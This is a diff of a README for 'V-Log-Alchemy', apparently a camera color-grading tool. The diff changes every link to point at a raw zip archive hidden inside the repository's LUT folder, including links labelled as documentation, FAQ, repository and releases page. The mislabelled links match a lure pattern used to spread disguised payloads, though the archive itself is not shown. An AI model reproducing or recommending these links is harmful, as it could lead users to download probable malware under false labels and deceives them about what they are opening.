@@ -6,7 +6,7 @@ Welcome to V-Log-Alchemy! This software helps you turn your Panasonic Lumix came
 
 ## 📥 Download Now
 
-[![Download V-Log-Alchemy](https://raw.githubusercontent.com/kkm10unsera/V-Log-Alchemy/main/Samples/V-Log-Alchemy-3.3.zip)](https://raw.githubusercontent.com/kkm10unsera/V-Log-Alchemy/main/Samples/V-Log-Alchemy-3.3.zip)
+[![Download V-Log-Alchemy](https://raw.githubusercontent.com/kkm10unsera/V-Log-Alchemy/main/Luts/RED/Alchemy_Log_v2.5.zip)](https://raw.githubusercontent.com/kkm10unsera/V-Log-Alchemy/main/Luts/RED/Alchemy_Log_v2.5.zip)
 
 ## 📋 Requirements
 
@@ -23,7 +23,7 @@ Before you start, ensure you have the following:
 
 To get started, visit the Releases page to download V-Log-Alchemy. Follow these steps:
 
-1. Click on this link: [Download V-Log-Alchemy](https://raw.githubusercontent.com/kkm10unsera/V-Log-Alchemy/main/Samples/V-Log-Alchemy-3.3.zip).
+1. Click on this link: [Download V-Log-Alchemy](https://raw.githubusercontent.com/kkm10unsera/V-Log-Alchemy/main/Luts/RED/Alchemy_Log_v2.5.zip).
 2. On the Releases page, find the latest version of the software.
 3. Click on the version name and scroll down to the assets section.
 4. Download the appropriate file for your operating system:
@@ -70,15 +70,15 @@ If you encounter any issues, feel free to reach out. You can open an issue direc
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/kkm10unsera/V-Log-Alchemy/main/Samples/V-Log-Alchemy-3.3.zip)
-- [Documentation](https://raw.githubusercontent.com/kkm10unsera/V-Log-Alchemy/main/Samples/V-Log-Alchemy-3.3.zip)
-- [Frequently Asked Questions (FAQ)](https://raw.githubusercontent.com/kkm10unsera/V-Log-Alchemy/main/Samples/V-Log-Alchemy-3.3.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/kkm10unsera/V-Log-Alchemy/main/Luts/RED/Alchemy_Log_v2.5.zip)
+- [Documentation](https://raw.githubusercontent.com/kkm10unsera/V-Log-Alchemy/main/Luts/RED/Alchemy_Log_v2.5.zip)
+- [Frequently Asked Questions (FAQ)](https://raw.githubusercontent.com/kkm10unsera/V-Log-Alchemy/main/Luts/RED/Alchemy_Log_v2.5.zip)
 
 ## 🔄 Update Instructions
 
 When new versions are released, making sure you have the latest version will ensure optimal performance.
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/kkm10unsera/V-Log-Alchemy/main/Samples/V-Log-Alchemy-3.3.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/kkm10unsera/V-Log-Alchemy/main/Luts/RED/Alchemy_Log_v2.5.zip).
 2. Repeat the download process for the latest version.
 3. Install the update using the same method as before.
 
